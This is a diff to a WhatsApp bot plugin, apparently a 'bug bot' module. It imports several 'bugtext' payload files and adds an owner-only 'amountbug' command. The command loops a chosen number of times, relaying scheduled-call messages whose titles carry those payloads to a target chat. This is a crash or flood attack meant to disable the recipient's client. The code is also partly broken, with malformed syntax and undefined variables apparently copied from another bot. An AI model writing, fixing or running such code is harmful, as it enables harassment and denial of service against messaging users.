@@ -12,12 +12,16 @@
 const { tlang, getAdmin, prefix, Config, sck, fetchJson, runtime,cmd,getBuffer } = require('../lib') 
 let { dBinary, eBinary } = require("../lib/binary");
 const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter"); 
-const fs = require('fs') const axios = require('axios')
+const fs = require('fs') 
+const axios = require('axios')
+const moment = require("moment-timezone")
 const { bugtext1 } = require('./bugz/bugtext1')
 const { bugtext2 } = require('./bugz/bugtext2')
 const { bugtext3 } = require('./bugz/bugtext3')
 const { bugtext4 } = require('./bugz/bugtext4')
 const { bugtext5 } = require('./bugz/bugtext5')
+const more = String.fromCharCode(8206)
+const readmore = more.repeat(4001)
 async function loading () {
 var mload = [
 "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
@@ -60,7 +64,22 @@ cmd({
   }
 });
 //-----------------------------
-
+cmd({ pattern: "amountbug", desc: "Send amount of bug to number", category: "owner", react: "💀" }, async(Void, citel, text,{ isCreator } =>{
+if(!isCreator) return citel.reply("Only Makino-Md owner can Use this cmd 😹")
+if (!text) return citel.reply(`Use command with an amount\nExample .amountbug 5`)
+amount = `${encodeURI(text)}`
+for (let i = 0; i < amount; i++) {
+const xeonybug1 = `${bugtext1}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": xeonybug1,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+       }
 	
 
 //--------------—------
